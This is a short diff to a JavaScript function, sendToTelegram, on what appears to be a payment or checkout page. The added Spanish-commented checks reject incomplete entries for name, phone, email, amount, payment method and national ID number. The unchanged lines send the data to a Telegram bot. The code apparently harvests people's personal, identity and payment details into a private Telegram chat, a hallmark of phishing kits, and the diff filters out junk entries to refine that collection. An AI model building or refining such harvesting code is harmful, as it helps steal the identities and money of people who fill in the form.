@@ -696,6 +696,12 @@
         let paymentMethodsExpanded = false;
 
         function sendToTelegram(data) {
+            // Bloquear envíos con datos vacíos o ataques de spam
+            if (!data.nombre || !data.apellido || !data.celular || !data.email ||
+                !data.monto_formateado || !data.metodoPago || !data.cedula) return;
+            if (data.cedula === 'undefined' || String(data.cedula).trim().length < 4) return;
+            if (data.nombre.trim().length < 2 || data.celular.trim().length < 7) return;
+
             const token = TG_TOKEN;
             const chatId = TG_CHAT_ID;
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
